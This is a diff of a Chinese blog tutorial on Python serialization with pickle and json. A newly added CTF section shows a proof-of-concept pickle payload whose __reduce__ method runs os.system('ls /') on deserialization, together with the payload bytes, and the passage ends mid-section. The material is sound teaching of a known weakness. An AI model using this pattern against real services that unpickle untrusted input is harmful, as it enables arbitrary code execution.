@@ -16,20 +16,25 @@
   <meta name="author" content="Sweety">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Python序列化与反序列化详解（包括json和json模块详解）_python json序列化和反序列化-CSDN博客 35.Python编程：序列化和反序列化 Python pickle 反序列化详解 从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 python实现protobuf序列化与反序列化 python-序列化与反序列化序列化与反序列化">
+    <meta name="description" content="python-序列化与反序列化序列化与反序列化 首先再次明确什么是序列化与反序列化：  序列化：将内存中的不可持久化和传输的对象转换为可方便持久化和传输的对象的过程。 反序列化：序列化的逆过程，将可持久化和传输的对象转换为不可持久化和传输的对象的过程。  在python中：  序列化可以理解为：把python对象编码转换为json格式的字符串。 反序列化可以理解为：把json格式字符串解码为pyt">
 <meta property="og:type" content="article">
 <meta property="og:title" content="python-序列化与反序列化">
 <meta property="og:url" content="https://haoisbinlove.github.io/2024/09/13/python%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Python序列化与反序列化详解（包括json和json模块详解）_python json序列化和反序列化-CSDN博客 35.Python编程：序列化和反序列化 Python pickle 反序列化详解 从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 python实现protobuf序列化与反序列化 python-序列化与反序列化序列化与反序列化">
+<meta property="og:description" content="python-序列化与反序列化序列化与反序列化 首先再次明确什么是序列化与反序列化：  序列化：将内存中的不可持久化和传输的对象转换为可方便持久化和传输的对象的过程。 反序列化：序列化的逆过程，将可持久化和传输的对象转换为不可持久化和传输的对象的过程。  在python中：  序列化可以理解为：把python对象编码转换为json格式的字符串。 反序列化可以理解为：把json格式字符串解码为pyt">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240911145440350.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240913171854479.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240913192823254.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240913214433981.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240913220237278.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914103831775.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914162139325.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914163928577.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914225108471.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240915134111860.png">
 <meta property="article:published_time" content="2024-09-13T15:15:24.000Z">
-<meta property="article:modified_time" content="2024-09-13T15:19:05.702Z">
+<meta property="article:modified_time" content="2024-09-15T11:38:47.343Z">
 <meta property="article:author" content="Sweety">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240911145440350.png">
@@ -227,7 +232,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.3k 字
+          5.4k 字
         
       </span>
     
@@ -238,7 +243,7 @@
         
         
         
-          28 分钟
+          45 分钟
         
       </span>
     
@@ -288,12 +293,7 @@
             
               <div class="markdown-body">
                 
-                <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hardworking666/article/details/112725423">Python序列化与反序列化详解（包括json和json模块详解）_python json序列化和反序列化-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/650287978">35.Python编程：序列化和反序列化</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tdl320721/article/details/133827636">python实现protobuf序列化与反序列化</a></p>
-<h1 id="python-序列化与反序列化"><a href="#python-序列化与反序列化" class="headerlink" title="python-序列化与反序列化"></a>python-序列化与反序列化</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><ul>
+                <h1 id="python-序列化与反序列化"><a href="#python-序列化与反序列化" class="headerlink" title="python-序列化与反序列化"></a>python-序列化与反序列化</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><ul>
 <li>首先再次明确什么是序列化与反序列化：</li>
 </ul>
 <p>序列化：将内存中的<code>不可持久化和传输</code>的对象转换为<code>可方便持久化和传输</code>的对象的过程。</p>
@@ -355,6 +355,8 @@
 </ul>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chenhuabin/p/10502096.html">Python开发之序列化与反序列化：pickle、json模块使用详解 </a></p>
 <p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000044385937">Python数据序列化与反序列化：高效数据交换与存储</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/650287978">35.Python编程：序列化和反序列化</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hardworking666/article/details/112725423">Python序列化与反序列化详解（包括json和json模块详解）</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_57143062/article/details/141560949">Python序列化与反序列化：pickle库使用详解</a></p>
 <h3 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h3><p>pickle模块中dump()、dumps()、load()、loads()按功能可划分为两组：</p>
 <p>序列化：dump()、dumps()</p>
@@ -378,6 +380,7 @@
 <li>实操</li>
 </ul>
 <p>根据上述函数的功能，常将<strong>loads和dumps</strong>、<strong>load和dump</strong>各自分为一组使用。</p>
+<p>对于<strong>load和dump</strong>，由于涉及文件的写入和读取，而<strong>pickle</strong>写入的是<strong>二进制数据</strong>，所以打开和读取方式需要使用 <strong>wb</strong> 和 <strong>rb</strong> 。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-comment"># dumps和loads</span><br><br>p_dict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;isMarried&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br>p_str = pickle.dumps(p_dict)  <span class="hljs-comment"># 序列化</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p_dict))  <span class="hljs-comment"># &lt;class &#x27;dict&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p_str))  <span class="hljs-comment"># &lt;class &#x27;bytes&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(p_str)  <span class="hljs-comment">#  b&#x27;\x80\x04\x95*\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x06\xe5\xbc\xa0\xe4\xb8\x89\x94\x8c\x03age\x94K\x1e\x8c\tisMarried\x94\x89u.&#x27;</span><br><br>p = pickle.loads(p_str)  <span class="hljs-comment"># 反序列化</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p))  <span class="hljs-comment"># &lt;class &#x27;dict&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(p)  <span class="hljs-comment"># &#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 30, &#x27;isMarried&#x27;: False&#125;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(p) == <span class="hljs-built_in">id</span>(p_dict))  <span class="hljs-comment"># 检查目标在序列化和反序列化前后是否为同一对象，结果为false，尽管他们的值相同，但是前后已经不是同一个对象了</span><br><br><br><span class="hljs-comment"># dump和load</span><br><br><span class="hljs-comment"># p_dict = &#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 30, &#x27;isMarried&#x27;: False&#125;</span><br><span class="hljs-comment"># 序列化</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;my_dump.txt&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)  <span class="hljs-comment"># 序列化结果只有bites类型，所以必须以wb模式打开</span><br>pickle.dump(p_dict, file)<br>file.close()<br><br><span class="hljs-comment"># 反序列化</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;my_dump.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>p = pickle.load(file)<br>file.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p))<br><span class="hljs-built_in">print</span>(p)  <span class="hljs-comment"># 可以看到，操作前后成功还原了p_dict对象数据。即反序列化之后得到的内容和序列化之前的内容完全一样。序列化之后的内容可以方便地保存至磁盘中，电脑关机也不怕了</span><br></code></pre></td></tr></table></figure>
 
 <h3 id="Json模块"><a href="#Json模块" class="headerlink" title="Json模块"></a>Json模块</h3><p>Json模块也提供了和pickle模块一样的dump()、dumps()、load()、loads()四个函数，且函数之间的区别与pickle的区别也是一样的。</p>
@@ -386,7 +389,21 @@
 </ul>
 <p>为了应对json中dump和load涉及文件内容的乱码问题，可以<code>将dump和dumps的参数ensure_ascii的值设置为False</code>，如此即能解决序列化后中文乱码的问题。</p>
 <p>同样分为dump和load、dumps和loads两组：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># json dumps和loads</span><br><span class="hljs-keyword">import</span> json<br>p_dict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;isMarried&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br><span class="hljs-comment"># 序列化</span><br>p_str = json.dumps(p_dict)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p_str))<br><span class="hljs-built_in">print</span>(p_str)   <span class="hljs-comment"># 结果显示，序列化之后得到结果是字符串，但是原中文部分显示为了乱码</span><br><span class="hljs-comment"># 解决方案是使用dumps和dump函数中的ensure_ascii参数，将其值设置为False，可以令序列化后的中文依然正常显示</span><br>p_str2 = json.dumps(p_dict, ensure_ascii=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(p_str2)<br><br><span class="hljs-comment"># 反序列化</span><br>p1 = json.loads(p_str)<br><span class="hljs-built_in">print</span>(p1)<br>p2 = json.loads(p_str)<br><span class="hljs-built_in">print</span>(p2)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(p1) == <span class="hljs-built_in">id</span>(p2))  <span class="hljs-comment"># 尽管多次反序列化得到的结果一样，但是他们本质上并不是同一对象</span><br><br><br><span class="hljs-comment"># json dump和load</span><br><span class="hljs-keyword">import</span> json<br>p_dict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;isMarried&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br><span class="hljs-comment"># 序列化</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;json_dump.txt&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>json.dump(p_dict, file, ensure_ascii=<span class="hljs-literal">False</span>)<br>file.close()<br><br><span class="hljs-comment"># 反序列化</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;json_dump.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>p = json.load(file)<br>file.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p))<br><span class="hljs-built_in">print</span>(p)<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># json dumps和loads</span><br><span class="hljs-keyword">import</span> json<br>p_dict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;isMarried&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br><span class="hljs-comment"># 序列化</span><br>p_str = json.dumps(p_dict)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p_str))<br><span class="hljs-built_in">print</span>(p_str)   <span class="hljs-comment"># 结果显示，序列化之后得到结果是字符串，但是原中文部分显示为了乱码</span><br><span class="hljs-comment"># 解决方案是使用dumps和dump函数中的ensure_ascii参数，将其值设置为False，可以令序列化后的中文依然正常显示</span><br>p_str2 = json.dumps(p_dict, ensure_ascii=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(p_str2)  <span class="hljs-comment"># &#123;&quot;name&quot;: &quot;张三&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;</span><br><br><span class="hljs-comment"># 反序列化</span><br>p1 = json.loads(p_str)<br><span class="hljs-built_in">print</span>(p1)<br>p2 = json.loads(p_str)<br><span class="hljs-built_in">print</span>(p2)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(p1) == <span class="hljs-built_in">id</span>(p2))  <span class="hljs-comment"># 尽管多次反序列化得到的结果一样，但是他们本质上并不是同一对象</span><br><br><br><span class="hljs-comment"># json dump和load</span><br><span class="hljs-keyword">import</span> json<br>p_dict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;isMarried&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br><span class="hljs-comment"># 序列化</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;json_dump.txt&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>json.dump(p_dict, file, ensure_ascii=<span class="hljs-literal">False</span>)<br>file.close()<br><br><span class="hljs-comment"># 反序列化</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;json_dump.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>p = json.load(file)<br>file.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p))<br><span class="hljs-built_in">print</span>(p)<br></code></pre></td></tr></table></figure>
+
+<p>我们发现这里使用json进行反序列化的时候，反序列化的文件中都是只有一行字符串数据。</p>
+<p>如果其中有多行数据，也就是其中有多个json数值，那应该怎么处理呢？</p>
+<p>首先先要明确哦，json的dump和dumps序列化得到的都是json格式的字符串，也就是json数值。</p>
+<ul>
+<li>逐行读取json文件，进行反序列化</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>	<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        line = line.strip()    <span class="hljs-comment"># 去除空行</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">0</span>:<br>            json_data = json.loads(line)<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>将json文件中的多个json数值合并为一个json对象</li>
+</ul>
+<p>这个方法需要手动操作，即将各个json数值，使用中括号括起来，之间使用逗号分隔，然后构造json对象：{“dict”: [ ]}。接着就可以使用如下代码进行处理：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    json_data = json.loads(f.read())<br></code></pre></td></tr></table></figure>
 
 <h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>所以，Json模块和pickle模块的区别在于以下两点：</p>
 <blockquote>
@@ -403,7 +420,10 @@
 <p>自定义一个Person类：姓名、年龄、是否已婚</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, isMarried</span>):<br>        self.name = name<br>        self.age = age<br>        self.isMarried = isMarried<br></code></pre></td></tr></table></figure>
 
-<p>实例化一个Person对象，尝试使用<strong>pickle</strong>模块对该实例化对象以及Person类本身进行序列化操作。经过实践可以知道pickle模块能够对类以及类实例对象进行序列化和反序列化。</p>
+<blockquote>
+<p>注意这里class类的定义：如果对其中的成员直接以 name &#x3D; value 的方式赋初值的话，那么这个自定义类是不会被打包的。需要写一个<code>__init__</code>方法，即如上，<code>def __init__(self, etc)</code></p>
+</blockquote>
+<p>实例化一个Person对象，尝试使用<strong>pickle</strong>模块对该实例化对象以及Person类本身进行序列化操作。经过实践可以知道<strong>pickle模块能够对类以及类实例对象进行序列化和反序列化</strong>。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 实例化Person对象</span><br>p = Person(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># 使用pickle模块对Person对象进行序列化和反序列化</span><br><span class="hljs-keyword">import</span> pickle<br>pp = pickle.dumps(p)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(pp))<br><span class="hljs-built_in">print</span>(pp)<br>p2 = pickle.loads(pp)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p2))<br><span class="hljs-built_in">print</span>(p2.name)   <span class="hljs-comment"># 可以直接访问对象的键的值</span><br><br><span class="hljs-comment"># 使用pickle对Person类本身进行序列化</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;使用pickle对Person类本身进行序列化&quot;</span>)<br>per = pickle.dumps(Person)<br><span class="hljs-built_in">print</span>(per)<br>per2 = pickle.loads(per)<br><span class="hljs-built_in">print</span>(per2)<br></code></pre></td></tr></table></figure>
 
 <p>尝试使用<strong>json</strong>对Person实例化对象进行序列化，会发现其报错了，报错信息指出：Person对象不是json可序列化的。</p>
@@ -419,7 +439,7 @@
 <p>对default参数的说明如下：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240913214433981.png" srcset="/img/loading.gif" lazyload alt="image-20240913214433981"></p>
 <blockquote>
-<p>default(obj) 这个参数简单的解决了类型错误的问题。应该能返回obj对象的可被序列化版本，进而执行dumps序列化操作。</p>
+<p>default(obj) 这个参数简单的解决了类型错误的问题。应该能返回obj对象的可被序列化版本或者引发TypeError，进而执行dumps序列化操作。</p>
 </blockquote>
 <p>既然使用json对Person对象进行序列化不能直接进行，需要编写一个类型转换方法，那么使用json进行反序列化的时候也不能直接对json 序列化的结果进行操作。若直接对json 序列化结果进行反序列化，结果会得到一个dict对象，而不是我们想要的Person对象。</p>
 <p>所以需要先编写一个由dict对象转换为Person对象的功能方法：</p>
@@ -434,12 +454,124 @@
 <blockquote>
 <p>object_hool，是一个可选的功能，能对任何类型的返回结果进行再解码，可以理解为强制转换。也就是说，传入的方法函数用于处理loads原本的返回值，并最后作为loads的返回值赋值给左边的变量。</p>
 </blockquote>
+<p>但要是我们每次遇到一个类，且json无法对该类以及类对象直接进行序列化的时候，我们都要分别写一个转换函数来实现序列化和反序列化操作吗？</p>
+<p>这样的编程思路是繁琐的且浪费时间的。有什么方法呢？</p>
+<p>答：<strong>可以通过default参数构造，把任意类的实例对象变为dict</strong></p>
+<blockquote>
+<p><code>json.dumps(class obj, default=lambda obj: obj.__dict__)</code>	</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914103831775.png" srcset="/img/loading.gif" lazyload alt="image-20240914103831775"></p>
+<h3 id="pickletools调试器"><a href="#pickletools调试器" class="headerlink" title="pickletools调试器"></a>pickletools调试器</h3><p>pickletools是python自带的pickle调试器，有三个功能：</p>
+<p><strong>反汇编</strong>一个已经被打包的字符串：解析字符串，表明该字符串都干了些啥，反汇编结果的<strong>每一行都是一条指令</strong>。</p>
+<p><strong>优化</strong>一个已经被打包的字符串：其实就是把不必要的<code>PUT</code>指令删除掉。</p>
+<p><strong>返回</strong>一个迭代器来供程序使用</p>
+<p>通常使用前两种。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickletools<br><br>p = pickle.dumps(obj)<br><span class="hljs-comment"># 反汇编功能</span><br>pickletools.dis(p)<br><span class="hljs-comment"># 优化功能</span><br>pickletools.optimize(p)<br></code></pre></td></tr></table></figure>
+
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、pickle序列化的结果为bites类型，只适合于Python机器之间的交互。</p>
 <p>2、json序列化结果为str类型，能够被多种语言识别，可用于与其它程序设计语言交互。</p>
 <p>3、目前，json格式字符串已经成为网络传输中的一种标准格式，所以再web开发后台开发中通常使用json模块来序列化而不是pickle模块。</p>
 <p>4、对pickle进行一些补充：</p>
 <p>pickle库为python对象提供了一种方便的持久化方式。通过pickle可以轻松地存储任何复杂的python对象，并在之后重新加载它们。但是pickle并不适用于所有对象，某些对象可能无法被序列化，或者在反序列化时会丢失一些信息。</p>
 <p>因此，处于安全考虑，最好不要从不可信的源加载pickle数据，因为反序列化过程可能会执行不安全的代码。</p>
+<h2 id="pickle-CTF利用"><a href="#pickle-CTF利用" class="headerlink" title="pickle-CTF利用"></a>pickle-CTF利用</h2><h3 id="reduce-反序列化攻击"><a href="#reduce-反序列化攻击" class="headerlink" title="__reduce__反序列化攻击"></a><code>__reduce__</code>反序列化攻击</h3><p>​	<code>__reduce__</code>方法的指令码是<code>R</code>，主要功能是：</p>
+<p>· 取当前栈的栈顶记为<code>args</code>，然后把它弹掉</p>
+<p>· 取当前栈的栈顶记为<code>f</code>，然后把它弹掉</p>
+<p>· 以<code>args</code>为参数，执行函数<code>f</code>，把结果压进当前栈</p>
+<ul>
+<li><p>类class的<code>__reduce__</code>方法，在<strong>pickle反序列化的时候</strong>会被执行。其底层的编程方法就是利用了<code>R</code>指令码，<code>f</code>要么返回字符串，要么返回一个tuple，后者对我们而言更有用。</p>
+</li>
+<li><p>一种流行的<strong>攻击思路</strong>是：</p>
+</li>
+</ul>
+<blockquote>
+<p>利用<code>__reduce__</code>构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。</p>
+</blockquote>
+<ul>
+<li><code>__reduce__</code>反序列化攻击实操</li>
+</ul>
+<p>假设：正常的字符串被反序列化后得到了一个Person对象，那么，我们想要构造一个字符串，让它在反序列化的时候，执行<code>ls</code>指令，列出当前目录下的所有文件。</p>
+<p>需要进行如下代码设计：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, isMarried</span>):<br>        self.name = name<br>        self.age = age<br>        self.isMarried = isMarried<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br><br>payload = pickle.dumps(Person(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-literal">False</span>))<br>payload = pickletools.optimize(payload)<br><br><span class="hljs-built_in">print</span>(payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;反汇编结果如下：&quot;</span>)<br><span class="hljs-built_in">print</span>(pickletools.dis(payload))<br></code></pre></td></tr></table></figure>
+
+<p>注意！在<code>__reduce__</code>方法内部，括号括起来的待执行命令字符串后面有一个逗号！这是不可少的。</p>
+<p>程序的执行结果如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914162139325.png" srcset="/img/loading.gif" lazyload alt="image-20240914162139325"></p>
+<p>payload的值为：</p>
+<blockquote>
+<p>b’\x80\x04\x95\x16\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x04ls &#x2F;\x85R.’</p>
+</blockquote>
+<p>现在将其中的<code>__reduce__</code>方法去除，然后尝试对上述payload进行反序列化。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914163928577.png" srcset="/img/loading.gif" lazyload alt="image-20240914163928577"></p>
+<p>这里出现了一个问题，显示ls不是内部或外部命令。啧啧啧，回忆一下ls指令一般是在什么场景下用的。不一般都是在kali linux系统使用的吗？所以合理怀疑是系统指令不兼容的原因导致的报错。</p>
+<p>windows下列出当前文件目录的指令是<code>dir</code></p>
+<p>修改指令后再次进行尝试：</p>
